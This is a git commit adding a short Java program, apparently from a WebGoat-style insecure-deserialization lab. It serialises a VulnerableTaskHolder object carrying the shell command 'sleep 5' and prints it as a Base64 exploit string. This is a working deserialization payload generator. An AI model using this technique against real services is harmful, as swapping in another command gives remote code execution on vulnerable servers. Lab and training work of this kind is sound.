c5e2390e1727679e8e7c05f741dcbf1ed199d27b
Trần Chí Mỹ <102143951+MyTran2508@users.noreply.github.com>
2023-03-10 21:23:38 +0700

    up

---
+++ src/org/dummy/insecure/framework/main.java
@@ -0,0 +1,23 @@
+package org.dummy.insecure.framework;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.util.Base64;
+
+public class main {
+    static public void main(String[] args){
+        try{
+            VulnerableTaskHolder go = new VulnerableTaskHolder("sleep", "sleep 5");
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(bos);
+            oos.writeObject(go);
+            oos.flush();
+            byte[] exploit = bos.toByteArray();
+            String exp = Base64.getEncoder().encodeToString(exploit);
+            System.out.println(exp);
+        } catch (Exception e){
+
+        }
+
+    }
+}
